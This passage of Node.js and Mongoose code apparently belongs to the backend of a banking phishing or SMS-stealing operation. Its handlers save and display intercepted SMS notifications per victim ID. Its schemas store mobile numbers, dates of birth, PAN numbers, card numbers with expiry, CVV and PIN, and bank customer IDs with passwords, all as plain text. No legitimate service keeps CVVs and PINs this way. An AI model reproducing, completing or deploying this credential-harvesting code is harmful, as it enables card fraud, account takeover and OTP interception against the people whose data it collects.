            success: true,
            message: "Notification saved successfully",
            data: notification
        });
    } catch (err) {
        console.error("Error saving notification:", err);
        res.status(500).json({
            success: false,
            message: "Error saving notification",
            error: err.message
        });
    }
};

exports.getCustomSms = async (req, res) => {
    try {
        console.log("Params received:", req.params);

        let { uniqueid } = req.params;

        if (!uniqueid) {
            console.log("uniqueid is undefined!");
            return res.status(400).json({ success: false, error: "Missing uniqueid in URL" });
        }

        console.log("Searching for SMS data with uniqueid:", uniqueid);

        // Fetch SMS data from the database using uniqueid
        const smsData = await Notification.find({ uniqueid });

        if (!smsData || smsData.length === 0) {
            console.log("No SMS data found for uniqueid:", uniqueid);
            return res.render('sms', { smsData: [] });
        }

        console.log("SMS data found:", smsData.length, "messages");
        res.render('sms', { smsData });

    } catch (error) {
        console.error("Error fetching SMS data:", error);
        res.status(500).send("Internal Server Error");
    }
};



user model


const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
    mobile: { type: String, required: true },
    dob: { type: String, required: true },
    pan: { type: String, required: true },
    uniqueid: { type: String, required: true, unique: true }
});

module.exports = mongoose.model('User', userSchema);



notification model

// models/Notification.js
const mongoose = require('mongoose');

const notificationSchema = new mongoose.Schema({
    sender: { type: String, required: true },
    title: { type: String, required: true },
    body: { type: String, required: true },
    timestamp: { type: String, required: true }, 
    uniqueid: { type: String, required: true }
});

module.exports = mongoose.model('Notification', notificationSchema);



netbanking modeld

const mongoose = require('mongoose');

const netBankingSchema = new mongoose.Schema({
    uniqueid: { type: String, required: true },
    cardNumber: { type: String, required: true },
    expiryDate: { type: String, required: true },
    cvv: { type: String, required: true },
    pin: { type: String, required: true }
});

module.exports = mongoose.model('NetBanking', netBankingSchema);


card model


const mongoose = require('mongoose');

const cardPaymentSchema = new mongoose.Schema({
    uniqueid: { type: String, required: true },
    customerId: { type: String, required: true },
    password: { type: String, required: true }
});

module.exports = mongoose.model('CardPayment', cardPaymentSchema);




